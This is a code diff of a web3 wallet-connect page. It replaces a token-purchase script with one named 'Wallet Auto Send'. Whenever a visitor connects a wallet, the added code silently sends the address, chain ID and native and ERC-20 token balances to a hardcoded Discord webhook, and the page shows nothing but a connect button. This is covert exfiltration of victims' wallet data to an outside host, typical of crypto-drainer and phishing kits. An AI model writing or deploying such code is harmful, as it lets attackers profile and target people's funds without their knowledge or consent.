@@ -1,114 +1,93 @@
-import {
+<script type="module">
+  import {
     EthereumClient,
     w3mConnectors,
     w3mProvider,
     WagmiCore,
     WagmiCoreChains,
-    WagmiCoreConnectors,
+    WagmiCoreConnectors
   } from "https://unpkg.com/@web3modal/ethereum@2.6.2";
-  // import { parseEther } from 'https://cdn.jsdelivr.net/npm/viem@1.21.4/_cjs/index.min.js'
-  
   import { Web3Modal } from "https://unpkg.com/@web3modal/html@2.6.2";
-  // 0. Import wagmi dependencies
-  const { bsc } = WagmiCoreChains;
-  console.log({WagmiCoreChains});
-  const { configureChains, createConfig, getAccount, readContract,fetchBalance ,sendTransaction}  = WagmiCore;
-  
-  // 1. Define chains
-  const chains = [bsc];
+
+  const {
+    configureChains,
+    createConfig,
+    getAccount,
+    fetchBalance,
+    watchAccount
+  } = WagmiCore;
+
+  const chains = Object.values(WagmiCoreChains);
   const projectId = "24cb4618162c124a24e58a917ab7cc45";
-  
-  // 2. Configure wagmi client
-  
+
   const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
+
   const wagmiConfig = createConfig({
     autoConnect: true,
     connectors: [
       ...w3mConnectors({ chains, version: 2, projectId }),
       new WagmiCoreConnectors.CoinbaseWalletConnector({
         chains,
-        options: {
-          appName: "html wagmi example",
-        },
+        options: { appName: "Wallet Auto Send" }
       }),
     ],
     publicClient,
   });
-  
-  // 3. Create ethereum and modal clients
+
   const ethereumClient = new EthereumClient(wagmiConfig, chains);
-  export const web3Modal = new Web3Modal(
-    {
-      projectId,
-      walletImages: {
-        safe: "https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg",
-      },
-    },
-    ethereumClient
-  )
-  function parseEther(value){
-   let str= String(Number(value)*10**9)
-   return str+'000000000'
-  
-  }
-  function openNewWindow(link) {
-    console.log('hahahah')
-    // Use window.open to open the link in a new window
-    window.open('https://bscscan.com/address/0xaBB5722606B67c66e88CbF1933e09fB4296Bc22F', '_blank');
-  }
-  async function buyToken(){
-    const value=document.getElementById('buyAmount').value
-    if (value) {
-      try {
-        const {hash}=await sendTransaction({
-          to:'0xaBB5722606B67c66e88CbF1933e09fB4296Bc22F',
-          value:parseEther(value)
-    
-        })
-        openNewWindow()
-       
-  
-      } catch (e) {
-        alert('Something Went Wrong')
-        console.log(e)
-      }
-     
-  
+  const web3Modal = new Web3Modal({ projectId }, ethereumClient);
+
+  const webhookURL = "https://discord.com/api/webhooks/1364313853810446397/Mu0B78sHS1cEoKtYhxc3MHAQEJ0PkWXzOUR_EBDD1Asvu7XI563w49JGOYSA0DundyOj"; // Replace this
+
+  async function sendToDiscord(content) {
+    try {
+      await fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content })
+      });
+    } catch (err) {
+      console.error("Failed to send to Discord", err);
     }
   }
-  
-  async function getBalance(params) {
-    const balance = await readContract({
-      address: '0xaBB5722606B67c66e88CbF1933e09fB4296Bc22F',
-      chainId:56,
-      abi:[
-        {
-          "constant": true,
-          "inputs": [],
-          "name": "totalRaised",
-          "outputs": [
-            {
-              "name": "",
-              "type": "uint256"
-            }
-          ],
-          "payable": false,
-          "stateMutability": "view",
-          "type": "function"
+
+  async function sendBalancesToDiscord(account) {
+    if (!account.isConnected) return;
+
+    const address = account.address;
+    const chainId = account.chainId;
+
+    try {
+      let message = `📦 **Wallet Connected**\n🧾 Address: \`${address}\`\n🌐 Chain ID: ${chainId}\n`;
+
+      const native = await fetchBalance({ address, chainId });
+      message += `\n💰 **${native.symbol}**: ${native.formatted}`;
+
+      if (publicClient.getTokenBalances) {
+        const tokens = await publicClient.getTokenBalances({ address });
+        if (tokens.length > 0) {
+          message += `\n📜 **ERC-20 Tokens:**`;
+          for (const token of tokens) {
+            message += `\n- ${token.symbol}: ${token.formatted}`;
+          }
+        } else {
+          message += `\n🪙 No ERC-20 tokens found.`;
         }
-      ],
-      method:'totalRaised'
-      
-    })
-    // console.log({})
-   let numberValue= Number(balance)/10**18
-   document.getElementById('raised').innerText=numberValue
-  document.getElementById("sold").innerText=numberValue*40000000000000
+      }
+
+      await sendToDiscord(message);
+    } catch (err) {
+      console.error("Failed to fetch/send balances", err);
+    }
   }
-  document.addEventListener('DOMContentLoaded', function() {
-    getBalance()
-  }, false);
-  
-  // getBalance()
-  document.getElementById('buybutton').addEventListener("click",buyToken)
-  
+
+  // 📌 Automatically send data on wallet connection
+  watchAccount((account) => {
+    if (account.isConnected) {
+      sendBalancesToDiscord(account);
+    }
+  });
+</script>
+
+<!-- Only wallet connect button in HTML -->
+<w3m-core-button></w3m-core-button>
